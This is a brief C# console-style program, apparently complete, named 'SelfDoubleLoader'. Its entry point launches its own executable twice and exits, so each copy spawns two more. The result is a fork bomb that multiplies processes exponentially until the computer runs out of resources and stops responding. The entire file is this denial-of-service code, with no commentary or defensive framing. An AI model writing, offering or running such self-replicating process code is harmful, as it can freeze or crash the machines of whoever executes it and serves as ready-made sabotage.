using System;
using System.IO;
using System.Windows.Forms;

namespace SelfDoubleLoader
{
    static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            System.Diagnostics.Process.Start(Application.ExecutablePath);
            System.Diagnostics.Process.Start(Application.ExecutablePath);
            return;


        }
    }
}
